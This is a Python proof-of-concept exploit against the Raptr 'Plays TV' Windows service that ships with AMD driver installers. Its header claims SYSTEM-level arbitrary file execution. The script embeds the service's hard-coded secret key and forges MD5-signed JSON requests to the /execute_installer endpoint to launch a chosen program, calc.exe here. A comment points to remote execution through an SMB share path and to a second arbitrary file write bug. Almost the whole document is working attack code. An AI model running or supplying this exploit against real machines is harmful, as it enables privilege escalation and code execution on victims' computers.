########################################################################
#  http://support.amd.com/en-us/download?cmpid=CCCOffline - 
#  Click "Automatically Detect - Download Now"
#  Installation Automatically Installs "Raptr, Inc Plays TV Service"
#
#  OR
#
#  https://plays.tv/download
#
#  Target OS:   Windows( Any )
#  Privilege:   SYSTEM
#  Type:        Arbitrary File Execution
#
#  Notes:       Second minor bug allows for arbitrary file write of 
#               uncontrolled data using the /extract_files path.
#
########################################################################

#!/usr/bin/python3
import urllib.request
import json
import hashlib

def check_svc( path, data ):
      
  #Setup request
  request = urllib.request.Request(addr)

  #add post data
  try:
    resp = urllib.request.urlopen(request, "data".encode("utf-8"))
    return "[-] Not Raptr, Plays TV service"
  except urllib.error.HTTPError as err:
    error_message = err.read().decode("utf-8")
    if error_message == 'Security failed - Missing hash or message[data]':
        return "[+] Raptr, Plays TV service"

def post_req( path, data ):
  
  secret_key = 'a%qs0t33QgiE6ut^0I&Y'
    
  #Setup request
  request = urllib.request.Request(addr)
  json_data = json.dumps(data)
  
  m = hashlib.md5()
  hash_data = path + json_data + secret_key
  m.update(hash_data.encode('utf8'))
  hash_str = m.hexdigest()
  
  #add post data
  p_data = urllib.parse.urlencode({'data' : json_data, 'hash' : hash_str }).encode("utf-8")
  resp = urllib.request.urlopen(request, p_data)
  return resp.read()

#Target IP address
ip = '127.0.0.1'

##############################################################
# The service binds to an ephemeral port defined at
# [HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\PlaysTV\Service] 
##############################################################
port = 50452

##############################################################
# The service calls CreateProcess with the following format: 
# '"%s" -appdata "%s" -auto_installed 1' % (installer, appdata)
#
# One way to achieving remote code execution is to use SMB
# cmd = "\\\\<IP ADDRESS>\\<SHARE>\\<FILE>"
##############################################################
cmd = "C:\\Windows\\System32\\calc.exe"       #Local Execution
data = {
  "installer": cmd,
  "appdata": cmd
}

#Set url
path = '/execute_installer'
addr = 'http://' + ip + ':' + str(port) + path

#Check if the remote service is a Raptr Plays TV svc
#ret = check_svc(data, path)
#print(ret)

#Exploit service
ret = post_req(path, data)
print(ret)